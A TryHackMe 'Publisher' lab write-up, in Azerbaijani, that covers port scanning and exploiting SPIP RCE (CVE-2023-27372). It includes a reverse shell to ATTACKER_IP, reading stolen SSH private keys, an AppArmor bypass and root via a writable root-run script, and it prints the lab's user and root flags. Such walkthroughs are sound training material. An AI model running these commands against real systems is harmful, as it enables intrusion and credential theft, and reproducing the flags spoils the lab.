# TryHackMe — Publisher Write-up

> Yalnız TryHackMe laboratoriyası üçündür. `TARGET_IP` və `ATTACKER_IP` dəyərlərini öz mühitinə uyğun dəyiş.

## Hücum zənciri

`Nmap → /spip → SPIP RCE → think shell → SUID run_container → AppArmor bypass → root SSH key`

## 1. Nmap

```bash
nmap -sC -sV -p- -T4 TARGET_IP -oN nmap.txt
```

Əsas portlar:

- `22/tcp` — SSH
- `80/tcp` — Apache HTTP

## 2. Web enumeration

```bash
gobuster dir -u http://TARGET_IP/ \
 -w /usr/share/wordlists/dirb/big.txt
```

`/spip` qovluğu tapılır. Saytın source koduna və footer hissəsinə baxanda SPIP CMS və versiyası görünür. Bu versiya köhnə olduğuna görə SPIP RCE zəifliyini yoxlamaq lazımdır.

## 3. SPIP RCE ilə ilkin giriş

Kali-də uyğun SPIP exploit-i axtar:

```bash
searchsploit SPIP
```

Exploit-in istifadə qaydasını oxu və target URL-ni `/spip` ilə ver. CVE-2023-27372 əsaslı exploit-lərdə URL və icra ediləcək komanda parametrləri tələb olunur.

```bash
python3 exploit.py -u http://TARGET_IP/spip/ -c 'id'
```

`uid=33(www-data)` kimi cavab görsən, RCE işləyir. Reverse shell üçün Kali-də listener aç:

```bash
nc -lvnp 4444
```

Sonra exploit vasitəsilə reverse shell komandası göndər:

```text
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## 4. `think` istifadəçisinə keçid

İlkin shell-dən istifadəçiləri və faylları yoxla:

```bash
cat /etc/passwd | grep bash
find /home /opt -type f 2>/dev/null
```

Web shell ilə `/home/think/.ssh/id_rsa` private key faylını oxumaq mümkündür. Faylı Kali-yə köçür:

```bash
chmod 600 id_rsa
ssh -i id_rsa think@TARGET_IP
```

User flag:

```bash
cat /home/think/user.txt
```

## 5. SUID binary-nin tapılması

```bash
find / -perm -4000 -type f 2>/dev/null
```

Şübhəli binary:

```text
/usr/sbin/run_container
```

Binary-nin nə etdiyini anlamaq üçün:

```bash
strings /usr/sbin/run_container
```

Nəticədə `/opt/run_container.sh` script-i ilə əlaqə görünür.

## 6. AppArmor yoxlaması

```bash
aa-status
cat /etc/apparmor.d/usr.sbin.ash
```

`ash` shell-i AppArmor tərəfindən məhdudlaşdırılır. Bəzi qovluqlar bloklanır, amma `/var/tmp` kimi qovluqdan istifadə etməyə icazə verilir.

Məhdud shell-i keçmək üçün ayrıca bash binary-si hazırla:

```bash
cp /bin/bash /var/tmp/bash
chsh -s /var/tmp/bash
```

Yeni sessiyaya keçdikdən sonra:

```bash
echo $SHELL
whoami
```

Bu mərhələnin məqsədi AppArmor-un yalnız `ash` üçün tətbiq etdiyi qaydalardan kənara çıxmaqdır.

## 7. `run_container.sh` və root

Əgər yeni shell ilə `/opt`-a yazmaq mümkündürsə, script-i yoxla:

```bash
ls -la /opt
cat /opt/run_container.sh
```

Script-ə root səlahiyyətli əmrlər əlavə etmək mümkündür. Məsələn, əvvəlcə root qovluğundakı faylları yoxlamaq üçün:

```bash
echo 'ls -la /root' >> /opt/run_container.sh
/usr/sbin/run_container
```

Nəticədə `/root/.ssh/id_rsa` private key görünürsə, onu oxu və Kali-yə köçür.

Kali-də:

```bash
chmod 600 root_key
ssh -i root_key root@TARGET_IP
cat /root/root.txt
```

## Flag-lər

```text
User flag:  fa229046d44eda6a3598c73da96f4ca5
Root flag:  3a4225cc9e85709adda6ef55d6a4f2ca
```

## Əsas öyrənilənlər

- Tam port scan vacibdir.
- CMS versiyasını müəyyən etmək exploit seçməyə kömək edir.
- SPIP RCE ilə web istifadəçisindən ilkin shell əldə edilir.
- SUID binary-ləri həmişə yoxlamaq lazımdır.
- AppArmor qaydaları proqram və shell-ə görə fərqli tətbiq oluna bilər.
- Root tərəfindən işlədilən writable script tam privilege escalation yarada bilər.
